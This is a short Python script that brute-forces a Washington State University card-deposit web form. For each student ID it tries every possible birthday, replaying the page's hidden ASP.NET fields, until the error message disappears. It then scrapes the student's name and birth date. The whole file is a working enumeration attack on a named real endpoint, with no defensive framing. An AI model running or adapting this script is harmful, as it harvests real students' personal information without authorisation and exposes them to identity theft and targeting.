import sys
import argparse

import requests
from bs4 import BeautifulSoup

from birthdays import BIRTHDAYS

ENDPOINT = "https://livingat.wsu.edu/cardinfo/deposit/default.aspx?mode=CC"

s = requests.session()


class Student:
    def __init__(self, wsu_id, name, birthday):
        self.wsu_id = wsu_id
        self.name = name
        self.birthday = birthday

    def __str__(self):
        return f"{self.wsu_id} -> {self.name} - Born {self.birthday}"


# TODO: Async requests
def lookup_wsu_id(wsu_id):
    response = s.get(ENDPOINT)
    bs = BeautifulSoup(response.text, 'html.parser')

    # Get hidden inputs to recreate request
    # No CSRF token because no login required
    view_state = bs.find(id="__VIEWSTATE").get('value')
    prev_page = bs.find(id="__PREVIOUSPAGE").get('value')  # Mayn't be necessary
    event_val = bs.find(id="__EVENTVALIDATION").get('value')

    for birthday in BIRTHDAYS:
        # Brute force every possible birthday for the WSU ID
        print(f"Trying {birthday} on ID {wsu_id}")
        response = s.post(
            ENDPOINT,
            data={
                # Hidden fields
                "__EVENTTARGET": "ctl00$mainContent$btnContinue",
                "__VIEWSTATE": view_state,
                "__PREVIOUSPAGE": prev_page,
                "__EVENTVALIDATION": event_val,
                # POST data that user would usually provide
                "ctl00$mainContent$txtWSUID": wsu_id,
                "ctl00$mainContent$DropDownListMonth": birthday.month,
                "ctl00$mainContent$DropDownListDay": birthday.day,
            },
        )

        if "Birthday is incorrect" not in response.text:  # TODO: Better check
            # We hit the jackpot
            bs = BeautifulSoup(response.text, 'html.parser')
            name = bs.find(id="ctl00_mainContent_lblName").text.lstrip(" - ")
            return Student(wsu_id, name, birthday)
    else:
        raise ValueError(f"{wsu_id} has no birthday! It probably doesn't exist")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('wsu_ids', action='append', nargs='+')

    args = parser.parse_args(sys.argv)

    for wsu_id in args.wsu_ids:
        student = lookup_wsu_id(wsu_id)
        print(student)


if __name__ == '__main__':
    main()
